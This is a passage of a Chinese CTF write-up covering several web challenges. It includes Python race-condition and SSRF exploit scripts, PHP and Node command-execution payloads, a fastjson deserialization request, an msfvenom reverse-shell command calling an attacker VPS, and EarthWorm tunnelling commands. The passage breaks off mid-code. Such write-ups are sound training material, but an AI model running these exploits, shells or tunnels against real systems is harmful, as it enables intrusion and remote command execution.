&#x2F;var&#x2F;lib&#x2F;php&#x2F;session里面）。即使此时用户没有初始化Session，PHP也会自动初始化Session。<br>产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p><p>如果我们在其中插入一句话木马，它就会被写入sess_xxx里</p><img src="/article/2021xyb/image-20210903135456923.png" class="" title="image-20210903135456923" loading="lazy"><p>但是默认情况下，session.upload_progress.cleanup是开启的，一旦读取了所有POST数据，它就会清除进度信息，那就没用了，他读取完了会清除数据，那我们的代码就执行不了。</p><p>所以需要使用条件竞争，要赶在他还没有读取完post包上传的数据的时候就访问到这个sess_xxx文件，执行里面的代码。</p></blockquote><p>直接从网上找exp修改，目的就是对个网页<code>check2.php</code>进行上传，这里填充了一堆<code>a</code>，让它去占用时间给我们条件竞争创造更多机会，利用ssrf打<code>include123.php</code>，参数<code>u</code>包含session文件来命令执行</p><p>exp：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 8月 21, 2021"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> io<span class="token keyword">import</span> threadingbaseurl <span class="token operator">=</span> <span class="token string">"http://eci-2zefgf3p1ushlimyl69v.cloudeci1.ichunqiu.com/"</span>sessid <span class="token operator">=</span> <span class="token string">'gyy'</span>PAYLOAD <span class="token operator">=</span> <span class="token string">'&lt;?php eval(system(\'sh /getflag.sh\'));?>'</span><span class="token keyword">def</span> <span class="token function">getdir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"url1"</span><span class="token punctuation">:</span> <span class="token string">"http://127.0.0.1/admin/include123.php?u=/tmp/sess_"</span> <span class="token operator">+</span> sessid<span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    <span class="token comment"># cookies = "PHPSESSID=123".split("; ")</span>    <span class="token comment"># cookie = &#123;&#125;</span>    <span class="token comment"># for i in cookies:</span>    <span class="token comment">#     cookie[i.split("=")[0]] = i.split("=")[1]</span>    requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>baseurl <span class="token operator">+</span> <span class="token string">"check2.php"</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> sessid<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>    text <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>baseurl <span class="token operator">+</span> <span class="token string">"preview.php"</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> sessid<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">print</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span>    <span class="token keyword">return</span> text<span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>        resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>baseurl <span class="token operator">+</span> <span class="token string">"check2.php"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span> PAYLOAD<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                            files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'123.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> sessid<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>                            timeout<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        resp <span class="token operator">=</span> getdir<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'123.txt'</span> <span class="token keyword">in</span> resp<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span>            event<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+++++++++++++]retry"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>打了phpinfo发现可行</p><img src="/article/2021xyb/upload_22a92f54497d73c2f65e6f34c6dba9b6.png" class="" title="img" loading="lazy"><p>继续</p><img src="/article/2021xyb/upload_00c55368090301064d2ed35507ff9685.png" class="" title="img" loading="lazy"><p>读取根目录下文件</p><img src="/article/2021xyb/upload_4e9b7ae5eef86856696a48d5cceda801.png" class="" title="img" loading="lazy"><p>执行<code>/getflag.sh</code></p><img src="/article/2021xyb/image-20210903140536843.png" class="" title="image-20210903140536843" loading="lazy"><p>拿到flag</p><h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>赛后和 @h3h3QAQ 师傅聊了下，发现waf是可以绕过的（tqltql）</p><p>直接用反斜线绕过,payload:<code>./?u=&lt;?=system(&#39;gerf\lag.sh&#39;);?&gt;</code></p><img src="/article/2021xyb/image-20210903140902197.png" class="" title="image-20210903140902197" loading="lazy"><p>然后预览得到flag</p><img src="/article/2021xyb/image-20210903141054059.png" class="" title="image-20210903141054059" loading="lazy"><p>太猛了</p><hr><h3 id="层层穿透"><a href="#层层穿透" class="headerlink" title="层层穿透"></a>层层穿透</h3><p>Apache Flink老洞了<a href="https://www.freebuf.com/vuls/220252.html">https://www.freebuf.com/vuls/220252.html</a></p><p>利用msf生成个jar包</p><p><code> msfvenom -p java/shell_reverse_tcp LHOST=vps LPORT=1234 -f jar&gt;/media/psf/Home/Downloads/shell.jar</code></p><p>直接upload然后submit上线</p><p>题目说本机对应内网<code>10.10.1.12</code>，扫了<code>10.10.1.11</code> 的8080端口好像有东西</p><h4 id="利用ew内网穿透"><a href="#利用ew内网穿透" class="headerlink" title="利用ew内网穿透"></a>利用ew内网穿透</h4><p>利用ew内网穿透出来，放公网服务器，在靶机上用curl -O保存ew文件，然后执行，公网vps上转发流量</p><p>本人的描述可能有错误或不清楚的地方，还请师傅们多多指教</p><h5 id="公网主机"><a href="#公网主机" class="headerlink" title="公网主机"></a>公网主机</h5><p>如下，执行<code>./ew -s lcx_listen -l 1080 -e 8888</code> 将本机1080的流量转交到8888</p><img src="/article/2021xyb/image-20210903141554948.png" class="" title="image-20210903141554948" loading="lazy"><hr><h5 id="边界主机"><a href="#边界主机" class="headerlink" title="边界主机"></a>边界主机</h5><p>执行<code>./ew -s lcx_slave -d [vps] -e [port] -f 10.10.1.11 -g 8080</code></p><p>利用可控的内网主机打通<code>10.10.1.11:8080</code> 与我们公网vps的通讯隧道</p><img src="/article/2021xyb/image-20210903142010256.png" class="" title="image-20210903142010256" loading="lazy"><h4 id="网络状况描述"><a href="#网络状况描述" class="headerlink" title="网络状况描述"></a>网络状况描述</h4><p>· 本机：即我的攻击电脑</p><p>· 可控的公网IP主机：即我的在公网的服务器</p><p>· A主机：题目给出的靶机，有公网IP：47.104.135.101，内网IP：10.10.1.12，可访问B主机</p><p>· B主机：题目内网的目标靶机，8080端口有东西</p><p>目标：访问B主机的8080端口</p><pre class="language-none"><code class="language-none">                    一台可控公网IP主机                    可控内网主机A                      主机B+---------+     +----------------------+    |    +-------------------------+      +-------------------+|   本机   | -&gt;&gt; | 1080 -&gt;  vps -&gt; 8888 |  防火墙  | &lt;--    10.10.1.12   --&gt; | -&gt;&gt; | 8080 -&gt; 10.10.1.11 |+---------+     +----------------------+    |    +-------------------------+      +-------------------+</code></pre><hr><p>访问到了<code>10.10.1.11:8080</code></p><p>将题目附件的<code>web.jar</code> 反编译下，拿到了源码。</p><p>首先在<code>/doLogin</code> 路由登陆，审查源码得知 <code>用户名/密码</code> 分别为 <code>admin/123456</code> </p><p>然后拿到cookie转去<code>/admin/test</code>路由</p><p>根据源码，这里会先过waf然后解析json，而且json长度要大于20000</p><p>在github上找到了一份payload：<a href="https://github.com/depycode/fastjson-c3p0">https://github.com/depycode/fastjson-c3p0</a></p><p>fastjson-c3p0不出网回显利用，直接生成payload，然后复制几遍达到长度要求，改Content-Type为json，在header中添加cmd命令，获得flag</p><img src="/article/2021xyb/4D49F7AE6BBF284F438626001021582E.jpg" class="" title="4D49F7AE6BBF284F438626001021582E" loading="lazy"><p>Payload:</p><pre class="language-none"><code class="language-none">POST &#x2F;admin&#x2F;test HTTP&#x2F;1.1Host: 49.234.89.193:1080Cache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.150 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: closeCookie: JSESSIONID&#x3D;20337391D87A73966C86012AB6114638;Content-Type: application&#x2F;jsoncmd: cat &#x2F;flagContent-Length: 79583&#123;&quot;e&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,&quot;userOverridesAsString&quot;:&quot;HexAsciiSerializedMapquot;&#125;,&quot;（把上面两段再复制两遍）&#125;</code></pre><h3 id="crawler-z"><a href="#crawler-z" class="headerlink" title="crawler_z"></a>crawler_z</h3><p>观察 &#x2F;user&#x2F;profile 和 &#x2F;user&#x2F;verify 路由可知，profile 在处理 bucket 的更新时是先进行了更新再生成了 token。</p><p>而 verify 仅仅判断了库中是否存在所提交的 token 并且其 valid 为 true。</p><p>那么此时即存在了一个逻辑漏洞，先正常提交一次 bucket 更新，使得程序写入一个可行的 token，然后再次请求 profile 更新 bucket 为 SSRF 的值。使用第一次得到的 token 对第二次的恶意 bucket 进行 verify，从而成功达成 SSRF。由于此时的 bucket 被进行了如下校验。</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">static</span> <span class="token function">checkBucket</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span>protocol <span class="token operator">!=</span> <span class="token string">"http:"</span> <span class="token operator">&amp;&amp;</span> url<span class="token punctuation">.</span>protocol <span class="token operator">!=</span> <span class="token string">"https:"</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span>href<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'oss-cn-beijing.ichunqiu.com'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>因此我们构造链接的形式被迫变为 <a href="http://host/#oss-cn-beijing.ichunqiu.com">http://HOST#oss-cn-beijing.ichunqiu.com</a>  也就是说我们只能使用指定协议。</p><p>此时可以使用 302 跳转进行绕过，在服务器上写如下 PHP 代码来进行跳转，从而达成任意文件读取。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: file:///readflag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></code></pre><p>此时再提交链接后访问 &#x2F;bucket 路由即可触发一次访问。而访问所返回的内容则是根目录下 &#x2F;readflag 的内容。</p><p>结合题目的提示可知我们需要 RCE，而读取到了 &#x2F;readflag 则指明了方向。此时可以发现程序使用了 zombie 进行了访问，因此可以采用 zombie code injection 来进行 RCE，进而带出 flag。</p><p>公网vps写入：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">[</span><span class="token string">"constructor"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"constructor"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"return(global.process.mainModule.constructor._load('child_process').execSync('/readflag').toString())"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 8月 22, 2021"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> randombaseurl <span class="token operator">=</span> <span class="token string">"http://eci-2zedk1cbvvahhu2yuuyl.cloudeci1.ichunqiu.com:8888/"</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>header <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">verify</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl<span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">"user/verify?token=%s"</span> <span class="token operator">%</span> token<span class="token punctuation">)</span>    session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token string">"signup"</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>        <span class="token string">"password"</span><span class="token punctuation">:</span> password<span class="token punctuation">,</span>        <span class="token string">"password_confirm"</span><span class="token punctuation">:</span> password    <span class="token punctuation">&#125;</span>    <span class="token comment"># print(session.post(url, data=data, headers=header).text)</span>    session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"regist"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token string">"signin"</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>        <span class="token string">"password"</span><span class="token punctuation">:</span> password<span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    <span class="token comment"># print(session.post(url, data=data, headers=header))</span>    session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">modify</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token string">"user/profile"</span>    data1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"affiliation"</span><span class="token punctuation">:</span> <span class="token string">"ichunqiu123"</span><span class="token punctuation">,</span>        <span class="token string">"age"</span><span class="token punctuation">:</span> <span class="token number">12</span><span class="token punctuation">,</span>        <span class="token string">"bucket"</span><span class="token punctuation">:</span> <span class="token string">"https://895cdc8a2e67bbb23b5e6335fca98bc2.oss-cn-beijing.ichunqiu.com/"</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data1<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token comment"># print(res)</span>        token <span class="token operator">=</span> res<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"?token="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">"The page may be loading ..."</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    data2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"affiliation"</span><span class="token punctuation">:</span> <span class="token string">"ichunqiu123"</span><span class="token punctuation">,</span>        <span class="token string">"age"</span><span class="token punctuation">:</span> <span class="token number">12</span><span class="token punctuation">,</span>        <span class="token string">"bucket"</span><span class="token punctuation">:</span> payload<span class="token operator">+</span><span class="token string">"#oss-cn-beijing.ichunqiu.com"</span>    <span class="token punctuation">&#125;</span>    session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data2<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>    verify<span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token string">"user/bucket"</span>    res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\\n"</span><span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"The page may be loading ..."</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span>    register<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span>    login<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span>    <span class="token comment"># modify("http://vps/test.php?1=file:///flag")</span>    modify<span class="token punctuation">(</span><span class="token string">"http://vps/test3.php"</span><span class="token punctuation">)</span>    view<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><hr><h3 id="Secrets-Of-Admin"><a href="#Secrets-Of-Admin" class="headerlink" title="Secrets_Of_Admin"></a>Secrets_Of_Admin</h3><p>先看database.ts，直接给出账号密码，<code>admin/e365655e013ce7fdbdbf8f27b418c8fe6dc9354dc4c0328fa02b0ea547659645</code>,同时还有flag的sum值</p><p>flag在file&#x2F;flag中，审查代码发现我们要<strong>不是</strong>superuser<strong>且是</strong>admin才可以获取file下的文件，superuser被ban了</p><p>看<code>/</code>路由，由于database只要一个admin用户，所以直接登录，就是<code>isadmin</code>为true了</p><p>重定向到<code>/admin</code>路由，get方法没啥好说的，如果属于user的文件存在就写入cookie。 </p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> files <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">listFile</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>files<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">username</span><span class="token operator">:</span> token<span class="token punctuation">.</span>username<span class="token punctuation">,</span> <span class="token literal-property property">files</span><span class="token operator">:</span> files<span class="token punctuation">,</span> <span class="token literal-property property">isAdmin</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">signed</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><p>post方法可以看到ban掉了<code>&lt;</code>&#x2F;<code>script</code>&#x2F;<code>&gt;</code>等，从出题人的思路讲，可能是要打xss</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> <span class="token punctuation">&#123;</span> content <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> content <span class="token operator">==</span> <span class="token string">''</span> <span class="token operator">||</span> content<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">)</span> <span class="token operator">||</span> content<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">)</span> <span class="token operator">||</span> content<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token operator">||</span> content<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span> <span class="token operator">||</span> content<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'on'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// even admin can't be trusted right ? :)  </span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">'Forbidden word 🤬'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>使用了html-pdf依赖用于生成pdf，然后保存文件到xx.pdf</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> filename <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">uuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.pdf</span><span class="token template-punctuation string">`</span></span></code></pre><p>在<code>/api/files</code>路由下带参数可以加一条log，带<code>/sumid</code>可以访问文件，可以看到superuser被ban了 </p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span>username <span class="token operator">==</span> <span class="token string">'superuser'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Superuser is disabled now'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span></code></pre><p>但是关键点在于读取到文件后会进入模版渲染，加上前面ban了xss的东西，推测就是打xss了</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> filename <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">getFile</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span>username<span class="token punctuation">,</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname <span class="token punctuation">,</span> <span class="token string">"../files/"</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">await</span> <span class="token function">readFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname <span class="token punctuation">,</span> <span class="token string">"../files/"</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 